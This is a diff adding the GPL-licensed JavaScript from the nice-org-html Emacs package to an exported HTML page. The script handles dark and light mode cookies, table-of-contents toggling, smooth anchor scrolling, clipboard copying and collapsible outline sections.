+<!--/*--><![CDATA[/*><!--*/
+if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
+document.cookie = 'mode=dark'
+}
+document.cookie = 'light=modus-operandi-tinted'
+document.cookie = 'dark=modus-vivendi-tinted'
+/*
+;; nice-org-html.js
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+;; JS for html exported by et-org-html.el
+ */
+
+const preamble = document.getElementById("preamble");
+const content = document.getElementById("content");
+const postamble = document.getElementById("postamble");
+
+const controls = document.getElementById("view-controls");
+const toggleTocBtn = document.getElementById("toggle-toc");
+const gotoTopBtn = document.getElementById("goto-top");
+const toggleModeBtn = document.getElementById("toggle-mode");
+const toc = document.getElementById("table-of-contents");
+
+// Get and parse options passed in cookie string
+const optCookie = document.cookie.split('; ').find(r => r.startsWith('options'));
+const options = {};
+if (optCookie) {
+  optCookie.split('=')[1].split('__').forEach(pair => {
+    const [key, val] = pair.split(':');
+    if (key && val) {
+      options[key] = val;
+    }
+  })
+}
+
+// Move sticky control bar (injected within preamble)
+document.body.insertBefore(controls, content);
+
+// Mode handling
+function getMode() {
+  let cookie = document.cookie.split('; ').find(r => r.startsWith('mode'))
+  return cookie && cookie.split("=")[1];
+}
+
+function setMode(mode) {
+  document.body.dataset.mode = mode;
+  let thmCookie = document.cookie.split('; ').find(r => r.startsWith(mode));
+  document.body.dataset.theme = thmCookie ? thmCookie.split('=')[1] : 'unknown';
+  toggleModeBtn.innerHTML = (mode === 'light') ? '&#9789;' : '&#9788;';
+  document.cookie = 'mode=' + mode;
+}
+
+// Initially, set mode based on stored cookie
+let mode = getMode();
+if (mode && ["light", "dark"].includes(mode)) {
+  setMode(mode);
+} else {  
+  let prop = "prefers-color-scheme";
+  let pref = (mode === "query") && window.matchMedia &&
+    ["light", "dark"].find(s => window.matchMedia(`(${prop}: ${s})`).matches);
+  setMode(pref || "dark"); // fallback: dark
+}
+
+// Mode toggling
+toggleModeBtn.addEventListener('click', () => {
+  setMode(document.body.dataset.mode === 'dark' ? 'light' : 'dark');
+})
+
+
+// Jump to top
+let scrollY = document.documentElement.scrollTop;
+window.addEventListener('scroll', () => {
+  let atTop = document.documentElement.scrollTop <= preamble.offsetHeight;
+  gotoTopBtn.dataset.show = !atTop + "";
+});
+gotoTopBtn.addEventListener('click', () => {
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
+})
+
+// Table-of-contents toggling
+if (toc) {
+  toggleTocBtn.dataset.show = 'true';
+  toggleTocBtn.addEventListener('click', () => {
+    let showingToc = document.body.dataset.toc;
+    scrollY = showingToc ? scrollY : document.documentElement.scrollTop;
+    if (showingToc) {
+      document.body.dataset.toc = '';
+      document.documentElement.scrollTop = scrollY;
+    } else {
+      let tocHeight =
+	Math.max(
+	  window.innerHeight - controls.offsetHeight,
+	  toc.offsetHeight
+	);
+      const header = document.getElementById("injected-header");
+      if (header && (scrollY > header.offsetHeight)) {
+	document.documentElement.scrollTop = preamble.offsetHeight;
+      }
+      toc.style.height = `${tocHeight}px`;
+      document.body.dataset.toc = 'true';
+    }
+    toc.addEventListener('click', () => {
+      if (document.body.dataset.toc) {
+	document.body.dataset.toc = '';
+	document.documentElement.scrollTop = scrollY;
+      }
+    })
+  })
+};
+
+// Instrument anchor linking for sticky control bar
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = e.currentTarget.getAttribute('href');
+    const target = document.querySelector(targetId);
+
+    setTimeout(() => {
+      const targetPos = target.getBoundingClientRect().top;
+      let offset = targetPos + document.documentElement.scrollTop;
+      offset -= controls.offsetHeight;
+      window.scrollTo({
+	top: offset,
+	behavior: "smooth"
+      });
+    }, 0);
+  });
+});
+
+function copyTextToClipboard(text) {
+  // Make invisible textarea
+  var textArea = document.createElement("textarea");
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+  textArea.style.padding = 0;
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+  textArea.style.background = 'transparent';
+
+  // Copy contents into it
+  textArea.value = text;
+
+  // Try to copy from it to clipboard
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  var res;
+  try {
+    res = document.execCommand('copy');
+  } catch (err) {
+    res = false;
+  }
+
+  // Remove invisible textarea
+  document.body.removeChild(textArea);
+
+  return res;
+}
+
+// Handle the default header / footer drawers
+const header = document.getElementById("generated-header");
+const footer = document.getElementById("generated-footer");
+
+if (header) {
+  let toggle = header.querySelector("header nav input.nav-toggle");
+  if (toggle) { toggle.checked = false; }
+}
+if (footer) {
+  let nav = footer.querySelector("nav");
+  let toggle = nav && nav.querySelector(".nav-toggle");
+  let navList = nav && nav.querySelector(".nav-list");
+  let navElem = navList && [...navList.querySelectorAll(".nav-item")];
+  let numLink = navElem && navElem.length;
+  if (numLink) {
+    toggle.checked = false;
+    toggle.addEventListener('change', () => {
+      if (toggle.checked) {
+	setTimeout(() => window.scrollTo({
+	  behavior: 'smooth',
+	  top: document.body.scrollHeight	  
+	}), 88);
+      }
+   });
+  }
+}
+
+function autoCompact() {
+  var anchor, links, overlap, trivial;
+  const domCompute = (node) => {
+    if (node) {
+      anchor = node.querySelector('.nav-title, .nav-author');
+      links = node.querySelector('.nav-list');
+      overlap = links.offsetLeft - 5 <= anchor.offsetLeft + anchor.offsetWidth;	
+      trivial = links.offsetLeft === anchor.offsetLeft;
+    }
+  };
+  let mediaMatch = window.matchMedia('(max-width: 768px)').matches;
+  [header, footer].forEach(e => {
+    if (e) {
+      if (mediaMatch) {
+	e.classList.add('compact');
+      } else {
+	domCompute(e);
+	if (overlap && !trivial) {
+	  e.classList.add('compact');
+	} else {	
+	  let clone = e.cloneNode(true);
+	  clone.style.top = '-2000px';
+	  clone.style.maxHeight = '0px';
+	  clone.classList.remove('compact');
+	  e.parentNode.insertBefore(clone, e);
+	  domCompute(clone);
+	  let toggle = e.querySelector('.nav-toggle');
+	  if (!overlap && toggle && !toggle.checked) {
+	    e.classList.remove('compact');
+	  }
+	  e.parentNode.removeChild(clone);
+	}
+      }
+    }
+  })
+}
+
+if ((header || footer)) {
+  if (options.hasOwnProperty('layout')) {
+    [header, footer].forEach(e => e ? e.classList.add(options.layout) : null);
+  } else {
+    autoCompact();
+    window.addEventListener('resize', autoCompact);
+  }
+}
+
+if (options.hasOwnProperty('src-lang') && options['src-lang'] == 't') {
+  let labels = [...document.querySelectorAll('.srcLangLabel')];
+  labels.forEach(l => l.style.display = 'inline-block');
+}
+
+if (options.hasOwnProperty('collapsing') && options.collapsing == 't') {
+  let levels = [2, 3, 4, 5, 6];
+  let containerPrefix = 'outline-container-';
+  levels.forEach(l => {
+    let containers = [...document.querySelectorAll(`.outline-${l}`)];
+    containers.forEach(c => {
+      let id = c.id.slice(containerPrefix.length);
+      let headline = document.getElementById(id);
+      let siblings = [...c.children].filter(child => child.id != id);
+      headline.classList.add('collapsible');
+      headline.addEventListener('click', () => {	
+	if (headline.classList.contains('collapsed')) {
+	  headline.classList.remove('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.remove('hidden');
+	  });	  
+	} else {
+	  headline.classList.add('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.add('hidden');
+	  });
+	}
+      })
+    })
+  })
+}
+/*]]>*/-->
+</script><div hidden>Generated by: https://github.com/ewantown/nice-org-html</div>
+</div>
+</body>
+</html>
